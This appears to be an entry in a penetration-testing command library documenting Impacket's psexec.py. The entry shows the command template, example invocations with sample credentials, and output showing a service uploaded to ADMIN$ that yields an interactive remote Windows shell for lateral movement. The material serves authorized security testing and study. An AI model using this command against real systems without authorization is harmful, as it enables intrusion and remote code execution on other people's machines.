---
id: 2151a2d8-f6b2-435f-9161-24aa956d54aa
name: impacket-psexec-spawn-remote-shell
type: command
executor: bash
data: 'psexec.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP'
output: |-
  root@kali:~# psexec.py Bob:secretpass@10.10.10.10
  Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

  INFO:root:Trying protocol 445/SMB...

  INFO:impacket:Requesting shares on 10.10.10.10.....
  INFO:impacket:Found writable share ADMIN$
  INFO:impacket:Uploading file XdtdcRDj.exe
  INFO:impacket:Opening SVCManager on 10.10.10.10.....
  INFO:impacket:Creating service lTiZ on 10.10.10.10.....
  INFO:impacket:Starting service lTiZ.....
  [!] Press help for extra shell commands
  Microsoft Windows [Version 10.0.18362.295]
  (c) 2019 Microsoft Corporation. All rights reserved.

  C:\Windows\system32>
created_at: '2019-10-01T17:58:48.946488+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - psexec
  - rce
  - lateral-movement
verified: true
validated: true
---

# impacket-psexec-spawn-remote-shell

## Command

```bash
psexec.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP
```

## Description

Spawns a remote command shell on a Windows target using the PSExec protocol over SMB. This command requires administrative credentials and access to the target's ADMIN$ share to upload and execute a service for remote access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Domain name for the target (optional if local) | No |
| $_USERNAME | Username with admin privileges | Yes |
| $_PASSWORD | Password for the username | Yes |
| $_TARGET_IP | IP address or hostname of the target Windows machine | Yes |

## Examples

### Basic Usage

```bash
psexec.py DOMAIN/administrator:Password123@192.168.1.100
```

### Advanced Usage

```bash
psexec.py WORKGROUP/user:pass@10.10.10.10 cmd /c whoami
```

## Expected Output

```
Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

INFO:root:Trying protocol 445/SMB...
INFO:impacket:Requesting shares on 10.10.10.10.....
INFO:impacket:Found writable share ADMIN$
INFO:impacket:Uploading file XdtdcRDj.exe
INFO:impacket:Opening SVCManager on 10.10.10.10.....
INFO:impacket:Creating service lTiZ on 10.10.10.10.....
INFO:impacket:Starting service lTiZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.18362.295]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

A successful execution drops into an interactive Windows command prompt on the remote system.

## Related

- [[tools/psexec-py-Impacket]]
